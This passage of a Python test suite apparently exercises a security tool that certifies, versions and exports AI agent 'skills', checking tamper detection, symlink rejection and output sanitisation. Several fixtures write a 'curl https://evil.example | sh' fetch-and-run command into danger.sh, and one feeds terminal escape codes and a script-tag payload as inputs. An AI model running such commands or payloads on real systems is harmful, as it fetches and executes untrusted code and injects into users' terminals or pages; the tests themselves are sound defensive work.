        if event["details"]["result"].get("command") == "show"
    )
    assert show_jsonl["details"]["result"]["verdict"] == "pass"
    assert show_jsonl["details"]["result"]["skill_name"] == skill.name

    sqlite_reader = SqliteEventReader(path=event_data / "security-events.db")
    try:
        pass_events = sqlite_reader.query(
            category="skill_ledger",
            verdict="pass",
        )
        show_sqlite = next(
            event
            for event in pass_events
            if event.details["result"].get("command") == "show"
        )
        assert show_sqlite.event_id == show_jsonl["event_id"]
        assert sqlite_reader.count_by("verdict", category="skill_ledger") == {"pass": 2}
    finally:
        sqlite_reader.close()

    monkeypatch.setenv("AGENT_SEC_DATA_DIR", str(event_data))
    runtime = DaemonRuntime(socket_path=event_data / "daemon.sock")
    list_result = security_events_list_handler(
        DaemonRequest(
            method="sec.events.list",
            params={"category": "skill_ledger", "verdict": "pass"},
        ),
        runtime,
    )
    dashboard_show = next(
        item
        for item in list_result.data["items"]
        if item["event_id"] == show_jsonl["event_id"]
    )
    assert dashboard_show["verdict"] == "pass"
    assert dashboard_show["command"] == "show"
    assert dashboard_show["skill_name"] == skill.name
    assert "details" not in dashboard_show

    summary_result = security_summary_handler(
        DaemonRequest(
            method="sec.summary",
            params={"category": "skill_ledger", "latest_limit": 10},
        ),
        runtime,
    )
    summary_show = next(
        item
        for item in summary_result.data["latest_events"]
        if item["event_id"] == show_jsonl["event_id"]
    )
    assert summary_show["verdict"] == "pass"
    assert summary_show["command"] == "show"
    assert summary_show["skill_name"] == skill.name


def test_show_findings_summary_handles_missing_fields_and_empty_findings(ws):
    skill = make_skill(
        ws.skills_dir, "decision-show-missing-findings", {"data.txt": "v1"}
    )
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-show-missing-fields-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-show-missing-fields-deny.json",
        [
            {
                "rule": "message-only",
                "level": "deny",
                "message": "message without file",
            },
            {"rule": "path-only", "level": "warn", "path": "danger.sh"},
        ],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("v2 risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    r = run_skill_ledger(["show", str(skill)], env_extra=env)
    assert r.returncode == 0, f"show exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert "[deny] message-only: message without file" in out["message"]
    assert "[warn] danger.sh path-only" in out["message"]

    drifted_skill = make_skill(
        ws.skills_dir, "decision-show-drifted", {"data.txt": "v1"}
    )
    drifted_findings = write_findings_file(
        ws.fixtures,
        "decision-show-drifted-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(drifted_skill), "--findings", str(drifted_findings)],
        env_extra=env,
    )
    (drifted_skill / "data.txt").write_text("v2 drifted")

    drifted = run_skill_ledger(["show", str(drifted_skill)], env_extra=env)
    assert drifted.returncode == 0, f"show exit {drifted.returncode}: {drifted.stderr}"
    drifted_out = parse_json_output(drifted.stdout)
    assert drifted_out["latestStatus"] == "drifted"
    assert "Latest findings:" not in drifted_out["message"]


def test_show_findings_summary_strips_control_characters(ws):
    skill = make_skill(
        ws.skills_dir, "decision-show-control-findings", {"data.txt": "v1"}
    )
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-show-control-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-show-control-deny.json",
        [
            {
                "rule": "ansi\x1b]0;owned\x07rule",
                "level": "deny",
                "file": "danger\x1b[2J.sh",
                "message": "line1\nline2\t\x00<script>alert(1)</script>\x9b",
            }
        ],
    )

    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("v2 risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    r = run_skill_ledger(
        ["show", str(skill), "--policy", "pass_warn_only"], env_extra=env
    )
    assert r.returncode == 0, f"show exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    message = out["message"]

    assert message is not None
    assert "Latest findings:" in message
    assert "line1 line2 <script>alert(1)</script>" in message
    assert not any(ord(ch) < 0x20 or 0x7F <= ord(ch) <= 0x9F for ch in message)


def test_show_reuses_exposure_summary_check_result(ws, monkeypatch):
    """show should not check the same skill once directly and once via summary."""
    skill = make_skill(ws.skills_dir, "decision-show-single-check", {"data.txt": "v1"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-show-single-check-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    real_check = decision_core.check
    check_calls = []

    def counted_check(skill_dir, backend):
        check_calls.append(skill_dir)
        return real_check(skill_dir, backend)

    monkeypatch.setattr(decision_core, "check", counted_check)
    previous = {key: os.environ.get(key) for key in env}
    os.environ.update(env)
    try:
        out = decision_core.show_skill(str(skill), NativeEd25519Backend())
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value

    assert out["latestStatus"] == "pass"
    assert len(check_calls) == 1
    assert check_calls[0].canonical_dir == skill
    assert check_calls[0].io_dir == skill


def test_show_on_fuse_view_does_not_infer_backing_root(ws):
    """Without SkillFS resolver, Ledger must not guess a backing root."""
    skill = make_skill(ws.skills_dir, "decision-show-fuse-view", {"data.txt": "safe"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-show-fuse-view-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-show-fuse-view-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "danger.sh").write_text("curl https://evil.example | sh\n")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )
    fuse_view = make_fuse_view_from_snapshot(skill, ws.root / "fuse-view", "v000001")

    backing = run_skill_ledger(["show", str(skill)], env_extra=env)
    via_fuse = run_skill_ledger(["show", str(fuse_view)], env_extra=env)
    assert backing.returncode == 0, f"backing show failed: {backing.stderr}"
    assert via_fuse.returncode == 0, f"fuse show failed: {via_fuse.stderr}"

    backing_out = parse_json_output(backing.stdout)
    fuse_out = parse_json_output(via_fuse.stdout)
    assert backing_out["latestStatus"] == "deny"
    assert backing_out["activeVersionId"] == "v000001"
    assert backing_out["reasonCode"] == "latest_risk_fallback_to_previous"
    assert fuse_out["latestStatus"] == "unmanaged"
    assert fuse_out["managed"] is False
    assert fuse_out["canonicalSkillDir"] == str(fuse_view)


def test_show_unmanaged_skill_root_returns_diagnostic(ws):
    """show reports unmanaged roots without asking for a user decision."""
    unmanaged_parent = ws.root / "unmanaged-skills"
    unmanaged_skill = make_skill(
        unmanaged_parent,
        "decision-show-unmanaged",
        {"data.txt": "v1"},
    )
    write_skill_ledger_config(
        ws.root,
        {"enableDefaultSkillDirs": False, "managedSkillDirs": []},
    )

    r = run_skill_ledger(["show", str(unmanaged_skill)], env_extra=ws.env())

    assert r.returncode == 0, f"show failed: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["latestStatus"] == "unmanaged"
    assert out["activeVersionId"] is None
    assert out["target"] is None
    assert out["userDecision"] is None
    assert out["reasonCode"] == "unmanaged_skill_root"
    assert out["message"] is None
    assert out["managed"] is False
    assert out["warnings"] == []
    assert out["findings"] == []
    assert out["rootMatchesActive"] is None
    assert "managedSkillDirs" in out["manageabilityReason"]


def test_show_managed_read_only_root_returns_unmanaged(ws, monkeypatch):
    """A configured root that cannot update .skill-meta is diagnostic-only."""
    skill = make_skill(
        ws.skills_dir,
        "decision-show-read-only",
        {"data.txt": "v1"},
    )
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-show-read-only-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )

    real_access = live_root_core.os.access

    def fake_access(path, mode):
        if Path(path) == skill / ".skill-meta" and mode == os.W_OK:
            return False
        return real_access(path, mode)

    monkeypatch.setattr(live_root_core.os, "access", fake_access)
    previous = {key: os.environ.get(key) for key in env}
    os.environ.update(env)
    try:
        out = decision_core.show_skill(str(skill), NativeEd25519Backend())
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value

    assert out["latestStatus"] == "unmanaged"
    assert out["managed"] is False
    assert out["message"] is None
    assert "not writable" in out["manageabilityReason"]


def test_decide_allow_on_fuse_view_updates_latest_without_rescanning(
    ws,
    monkeypatch,
):
    """allow via FUSE view must not sign the active snapshot as a new version."""
    skill = make_skill(ws.skills_dir, "decision-allow-fuse-view", {"data.txt": "safe"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-allow-fuse-view-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-allow-fuse-view-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "danger.sh").write_text("curl https://evil.example | sh\n")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )
    fuse_view = make_fuse_view_from_snapshot(skill, ws.root / "fuse-view", "v000001")
    root = live_root_core.ResolvedSkillRoot(fuse_view, skill, "skillfs")
    resolver_calls = []

    def fake_resolve(_resolver, canonical_skill_dir):
        resolver_calls.append(Path(canonical_skill_dir))
        return root

    monkeypatch.setattr(live_root_core.SkillRootResolver, "resolve", fake_resolve)

    r = run_skill_ledger(
        ["decide", str(fuse_view), "--action", "allow", "--reason", "reviewed"],
        env_extra=env,
    )

    assert r.returncode == 0, f"decide failed: {r.stderr}"
    assert resolver_calls == [fuse_view]
    assert sorted(
        p.name for p in (skill / ".skill-meta" / "versions").glob("*.json")
    ) == ["v000001.json", "v000002.json"]
    latest = read_latest_manifest(skill)
    assert latest["versionId"] == "v000002"
    assert latest["userDecision"]["action"] == "allow"
    assert latest["fileHashes"]["danger.sh"]
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": ".skill-meta/versions/v000002.snapshot",
    }


def test_default_discovery_does_not_make_fuse_view_managed(ws, monkeypatch):
    """Default discovery remains separate from canonical managed coverage."""
    skill = make_skill(
        ws.skills_dir,
        "decision-default-dir-fuse-view",
        {"data.txt": "safe"},
    )
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-default-dir-fuse-view-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-default-dir-fuse-view-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "danger.sh").write_text("curl https://evil.example | sh\n")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )
    fuse_parent = ws.root / "default-fuse-view"
    fuse_view = make_fuse_view_from_snapshot(skill, fuse_parent, "v000001")
    write_skill_ledger_config(
        ws.root,
        {"enableDefaultSkillDirs": True, "managedSkillDirs": []},
    )
    monkeypatch.setattr(config_module, "DEFAULT_SKILL_DIRS", [str(fuse_parent / "*")])

    shown = run_skill_ledger(["show", str(fuse_view)], env_extra=env)
    assert shown.returncode == 0, f"show failed: {shown.stderr}"
    shown_out = parse_json_output(shown.stdout)
    assert shown_out["latestStatus"] == "unmanaged"
    assert shown_out["managed"] is False
    assert shown_out["message"] is None

    latest = read_latest_manifest(skill)
    assert latest["versionId"] == "v000002"
    assert latest.get("userDecision") is None


def test_export_writes_snapshot_manifest_and_findings(ws):
    skill = make_skill(ws.skills_dir, "decision-export", {"data.txt": "risk"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "decision-export-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    out_dir = ws.root / "exported-risk-skill"

    r = run_skill_ledger(
        ["export", str(skill), "--version", "latest", "--output", str(out_dir)],
        env_extra=env,
    )
    assert r.returncode == 0, f"export exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)

    assert out["versionId"] == "v000001"
    assert (out_dir / "snapshot" / "data.txt").read_text() == "risk"
    assert json.loads((out_dir / "manifest.json").read_text())["scanStatus"] == "deny"
    findings_out = json.loads((out_dir / "findings.json").read_text())
    assert findings_out == [{"rule": "deny", "level": "deny", "message": "deny"}]


def test_export_latest_from_fuse_view_uses_signed_snapshot(ws, monkeypatch):
    """latest export is a read-only signed snapshot review path."""
    skill = make_skill(
        ws.skills_dir,
        "decision-export-fuse-view",
        {"data.txt": "safe"},
    )
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-export-fuse-view-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-export-fuse-view-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "danger.sh").write_text("curl https://evil.example | sh\n")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )
    fuse_view = make_fuse_view_from_snapshot(skill, ws.root / "fuse-view", "v000001")
    root = live_root_core.ResolvedSkillRoot(fuse_view, skill, "skillfs")
    resolver_calls = []

    def fake_resolve(_resolver, canonical_skill_dir):
        resolver_calls.append(Path(canonical_skill_dir))
        return root

    monkeypatch.setattr(live_root_core.SkillRootResolver, "resolve", fake_resolve)
    out_dir = ws.root / "exported-fuse-latest"

    r = run_skill_ledger(
        ["export", str(fuse_view), "--version", "latest", "--output", str(out_dir)],
        env_extra=env,
    )
    assert r.returncode == 0, f"export failed: {r.stderr}"
    out = parse_json_output(r.stdout)

    assert resolver_calls == [fuse_view]
    assert out["canonicalSkillDir"] == str(fuse_view)
    assert out["versionId"] == "v000002"
    assert (out_dir / "snapshot" / "data.txt").read_text() == "safe"
    assert (out_dir / "snapshot" / "danger.sh").read_text() == (
        "curl https://evil.example | sh\n"
    )
    assert json.loads((out_dir / "manifest.json").read_text())["scanStatus"] == "deny"


def test_export_latest_rejects_invalid_snapshot_artifact(ws):
    skill = make_skill(ws.skills_dir, "decision-export-tampered", {"data.txt": "risk"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "decision-export-tampered-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    (skill / ".skill-meta" / "versions" / "v000001.snapshot" / "data.txt").write_text(
        "tampered snapshot"
    )

    r = run_skill_ledger(
        [
            "export",
            str(skill),
            "--version",
            "latest",
            "--output",
            str(ws.root / "exported-tampered-snapshot"),
        ],
        env_extra=env,
    )

    assert r.returncode != 0
    assert "untrusted latest manifest" in r.stderr


def test_export_active_rejects_pending_stub_without_real_active_version(ws):
    """`active` export only accepts real ledger versions, not the review stub."""
    skill = make_skill(
        ws.skills_dir, "decision-export-active-pending", {"data.txt": "risk"}
    )
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "decision-export-active-pending-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    out = resolve_skill_activation(skill, env, policy="pass_warn_only")
    assert out["target"] == PENDING_DECISION_TARGET
    assert out["activeVersionId"] is None

    r = run_skill_ledger(
        [
            "export",
            str(skill),
            "--version",
            "active",
            "--output",
            str(ws.root / "exported-active-pending"),
        ],
        env_extra=env,
    )

    assert r.returncode != 0
    assert "no active version" in r.stderr


def test_export_rejects_unknown_version_and_nonempty_output(ws):
    skill = make_skill(ws.skills_dir, "decision-export-errors", {"data.txt": "v1"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "decision-export-errors-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    unknown = run_skill_ledger(
        [
            "export",
            str(skill),
            "--version",
            "v999999",
            "--output",
            str(ws.root / "exported-unknown"),
        ],
        env_extra=env,
    )
    assert unknown.returncode != 0
    assert "unknown export version" in unknown.stderr

    out_dir = ws.root / "exported-nonempty"
    out_dir.mkdir()
    (out_dir / "keep.txt").write_text("existing")
    nonempty = run_skill_ledger(
        [
            "export",
            str(skill),
            "--version",
            "latest",
            "--output",
            str(out_dir),
        ],
        env_extra=env,
    )
    assert nonempty.returncode != 0
    assert "already exists and is not empty" in nonempty.stderr


def test_resolver_target_helpers_and_empty_active_lookup(ws):
    skill = make_skill(ws.skills_dir, "resolve-helper-targets", {"data.txt": "risk"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "resolve-helper-targets-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    previous = {key: os.environ.get(key) for key in env}
    os.environ.update(env)
    try:
        backend = NativeEd25519Backend()
        assert resolver_core.snapshot_target("v000007") == (
            ".skill-meta/versions/v000007.snapshot"
        )
        assert resolver_core.pending_snapshot_target() == PENDING_DECISION_TARGET
        assert (
            resolver_core.find_latest_activation_snapshot(
                skill,
                backend,
                policy="pass_warn_only",
            )
            is None
        )
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value


def test_resolve_pass_warn_only_activates_warn_snapshot(ws):
    """pass_warn_only activates valid warn snapshots without warning."""
    skill = make_skill(ws.skills_dir, "resolve-pass-warn-warn", {"data.txt": "v1"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "resolve-pass-warn-warn-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    warn_findings = write_findings_file(
        ws.fixtures,
        "resolve-pass-warn-warn-warn.json",
        [{"rule": "warn", "level": "warn", "message": "warning"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("v2 warning")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(warn_findings)], env_extra=env
    )

    out = resolve_skill_activation(skill, env, policy="pass_warn_only")

    assert out["status"] == "warn"
    assert out["policy"] == "pass_warn_only"
    assert out["activeVersionId"] == "v000002"
    assert out["target"] == ".skill-meta/versions/v000002.snapshot"
    assert out["reasonCode"] == "normal"
    assert out["message"] is None
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": ".skill-meta/versions/v000002.snapshot",
    }

    r = run_skill_ledger(["show", str(skill)], env_extra=env)
    assert r.returncode == 0, f"show exit {r.returncode}: {r.stderr}"
    shown = parse_json_output(r.stdout)
    assert shown["latestStatus"] == "warn"
    assert shown["activeVersionId"] == "v000002"
    assert shown["reasonCode"] == "normal"
    assert shown["message"] is None
    assert shown["warnings"] == []
    assert shown["findings"] == [
        {"rule": "warn", "level": "warn", "message": "warning"}
    ]


def test_resolve_current_policy_skips_deny_snapshot(ws):
    """The current policy does not activate deny snapshots."""
    skill = make_skill(ws.skills_dir, "resolve-latest-deny", {"data.txt": "v1"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "resolve-latest-deny-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "resolve-latest-deny-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("v2 deny")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    out = resolve_skill_activation(skill, env, policy="pass_warn_only")

    assert out["status"] == "deny"
    assert out["policy"] == "pass_warn_only"
    assert out["activeVersionId"] == "v000001"
    assert out["target"] == ".skill-meta/versions/v000001.snapshot"


def test_resolve_pass_warn_only_skips_deny_snapshot(ws):
    """pass_warn_only skips deny snapshots and falls back to pass/warn history."""
    skill = make_skill(ws.skills_dir, "resolve-pass-warn-deny", {"data.txt": "v1"})
    env = ws.env()
    warn_findings = write_findings_file(
        ws.fixtures,
        "resolve-pass-warn-deny-warn.json",
        [{"rule": "warn", "level": "warn", "message": "warning"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "resolve-pass-warn-deny-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(warn_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("v2 deny")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    out = resolve_skill_activation(skill, env, policy="pass_warn_only")

    assert out["status"] == "deny"
    assert out["activeVersionId"] == "v000001"
    assert out["target"] == ".skill-meta/versions/v000001.snapshot"
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": ".skill-meta/versions/v000001.snapshot",
    }


def test_resolve_pass_warn_only_uses_pending_stub_without_pass_or_warn_snapshot(ws):
    """pass_warn_only exposes a safe review stub when only deny history exists."""
    skill = make_skill(ws.skills_dir, "resolve-pass-warn-only-deny", {"data.txt": "v1"})
    env = ws.env()
    deny_findings = write_findings_file(
        ws.fixtures,
        "resolve-pass-warn-only-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    out = resolve_skill_activation(skill, env, policy="pass_warn_only")

    assert out["status"] == "deny"
    assert out["activeVersionId"] is None
    assert out["target"] == PENDING_DECISION_TARGET
    assert out["reasonCode"] == "latest_risk_pending_decision"
    assert out["message"] is not None
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": PENDING_DECISION_TARGET,
    }
    assert_pending_stub(skill, leaked_files=["data.txt"])

    r = run_skill_ledger(["show", str(skill)], env_extra=env)
    assert r.returncode == 0, f"show exit {r.returncode}: {r.stderr}"
    shown = parse_json_output(r.stdout)
    assert shown["latestStatus"] == "deny"
    assert shown["activeVersionId"] is None
    assert shown["target"] == PENDING_DECISION_TARGET
    assert shown["userDecision"] is None
    assert shown["reasonCode"] == "latest_risk_pending_decision"
    assert shown["message"] is not None
    assert "Latest version v000001 is deny and is not exposed" in shown["message"]
    assert "no active safe version is exposed yet" in shown["message"]
    assert "Latest findings: [deny] deny: deny" in shown["message"]
    assert "export --version latest" in shown["message"]


def test_resolve_current_policy_excludes_none_snapshot(ws):
    """The current policy requires a pass/warn snapshot."""
    skill = make_skill(ws.skills_dir, "resolve-latest-none", {"data.txt": "v1"})
    env = ws.env()
    previous = {key: os.environ.get(key) for key in env}
    os.environ.update(env)
    try:
        backend = NativeEd25519Backend()
        manifest, _state, new_version_created = _prepare_manifest_for_update(
            str(skill),
            compute_file_hashes(skill),
            backend,
        )
        _persist_manifest_update(
            ResolvedSkillRoot(skill, skill, "host"),
            manifest,
            [],
            backend,
            new_version_created=new_version_created,
        )
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value

    out = resolve_skill_activation(skill, env, policy="pass_warn_only")

    assert out["status"] == "none"
    assert out["activeVersionId"] is None
    assert out["target"] == PENDING_DECISION_TARGET
    assert out["reasonCode"] == "latest_risk_pending_decision"
    assert out["message"] is not None
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": PENDING_DECISION_TARGET,
    }
    assert_pending_stub(skill, leaked_files=["data.txt"])


def test_resolve_rejects_unknown_activation_policy(ws):
    skill = make_skill(ws.skills_dir, "resolve-bad-policy", {"data.txt": "v1"})
    env = ws.env()

    with pytest.raises(ValueError, match="unsupported activation policy"):
        resolve_skill_activation(skill, env, policy="unknown")


def test_resolve_tampered_latest_uses_previous_trusted_version_file(ws):
    """tampering latest.json does not prevent fallback to intact version history."""
    skill = make_skill(ws.skills_dir, "resolve-tamper", {"data.txt": "v1"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "resolve-tamper-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    latest = skill / ".skill-meta" / "latest.json"
    data = json.loads(latest.read_text())
    data["scanStatus"] = "deny"
    latest.write_text(json.dumps(data))

    out = resolve_skill_activation(skill, env)

    assert out["status"] == "tampered"
    assert out["target"] == ".skill-meta/versions/v000001.snapshot"
    assert out["reasonCode"] == "tampered"
    assert out["message"] is not None


def test_resolve_skips_pass_version_when_snapshot_hash_mismatches(ws):
    """activation never points at a snapshot whose files no longer match manifest."""
    skill = make_skill(ws.skills_dir, "resolve-bad-snapshot", {"data.txt": "v1"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "resolve-bad-snapshot-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    (skill / ".skill-meta" / "versions" / "v000001.snapshot" / "data.txt").write_text(
        "tampered snapshot"
    )

    out = resolve_skill_activation(skill, env)

    assert out["status"] == "pass"
    assert out["activeVersionId"] is None
    assert out["target"] == PENDING_DECISION_TARGET
    assert out["reasonCode"] == "tampered"
    assert out["message"] is not None
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": PENDING_DECISION_TARGET,
    }
    assert_pending_stub(skill, leaked_files=["data.txt"])


def test_resolve_skips_version_file_with_mismatched_manifest_id(ws):
    """activation must verify and target the same version id."""
    skill = make_skill(ws.skills_dir, "resolve-version-mismatch", {"data.txt": "v1"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "resolve-version-mismatch-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    versions = skill / ".skill-meta" / "versions"
    shutil.copy2(versions / "v000001.json", versions / "v999999.json")
    bad_snapshot = versions / "v999999.snapshot"
    bad_snapshot.mkdir()
    (bad_snapshot / "data.txt").write_text("malicious runtime")

    out = resolve_skill_activation(skill, env)

    assert out["activeVersionId"] == "v000001"
    assert out["target"] == ".skill-meta/versions/v000001.snapshot"
    assert read_activation(skill)["target"] == ".skill-meta/versions/v000001.snapshot"


def test_resolve_rejects_snapshot_with_symlink(ws):
    """activation never exposes a snapshot containing symlinks."""
    skill = make_skill(ws.skills_dir, "resolve-snapshot-symlink", {"data.txt": "v1"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "resolve-snapshot-symlink-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    outside = ws.root / "outside-runtime.txt"
    outside.write_text("secret")
    (skill / ".skill-meta" / "versions" / "v000001.snapshot" / "escape").symlink_to(
        outside
    )

    out = resolve_skill_activation(skill, env)

    assert out["status"] == "pass"
    assert out["activeVersionId"] is None
    assert out["target"] == PENDING_DECISION_TARGET
    assert out["reasonCode"] == "tampered"
    assert out["message"] is not None
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": PENDING_DECISION_TARGET,
    }
    assert_pending_stub(skill, leaked_files=["data.txt"])


# ── Group 7: status command ───────────────────────────────────────────────


def test_status_human_readable_output(ws):
    """status returns ledger-wide overview with keys, config, skills sections."""
    env = ws.env()

    batch_root = ws.root / "status_batch_skills"
    batch_root.mkdir()
    for name in ("sa-skill-1", "sa-skill-2"):
        make_skill(batch_root, name, {"run.sh": f"echo {name}\n"})

    config_dir = ws.xdg_config / "agent-sec" / "skill-ledger"
    config_dir.mkdir(parents=True, exist_ok=True)
    config = {
        "enableDefaultSkillDirs": False,
        "managedSkillDirs": [str(batch_root / "*")],
    }
    (config_dir / "config.json").write_text(json.dumps(config))

    r = run_skill_ledger(["status"], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["command"] == "status"

    # keys section
    assert "keys" in out, f"Missing 'keys' section: {out}"
    assert out["keys"]["initialized"] is True

    # config section
    assert "config" in out, f"Missing 'config' section: {out}"
    assert out["config"]["customized"] is True

    # skills section with breakdown
    skills = out["skills"]
    assert skills["discovered"] == 2, f"Expected 2 discovered, got {skills}"
    assert skills["breakdown"]["none"] == 2
    assert skills["health"] == "unscanned"

    # no results by default (requires --verbose)
    assert "results" not in out, f"results should not appear without --verbose: {out}"


def test_status_drifted_shows_details(ws):
    """status health reflects drifted when a certified skill is modified."""
    env = ws.env()

    batch_root = ws.root / "status_drift_skills"
    batch_root.mkdir()
    skill = make_skill(
        batch_root,
        "drift-test",
        {"orig.txt": "original"},
    )

    config_dir = ws.xdg_config / "agent-sec" / "skill-ledger"
    config_dir.mkdir(parents=True, exist_ok=True)
    config = {
        "enableDefaultSkillDirs": False,
        "managedSkillDirs": [str(batch_root / "*")],
    }
    (config_dir / "config.json").write_text(json.dumps(config))

    findings = write_findings_file(
        ws.fixtures,
        "status-d.json",
        [
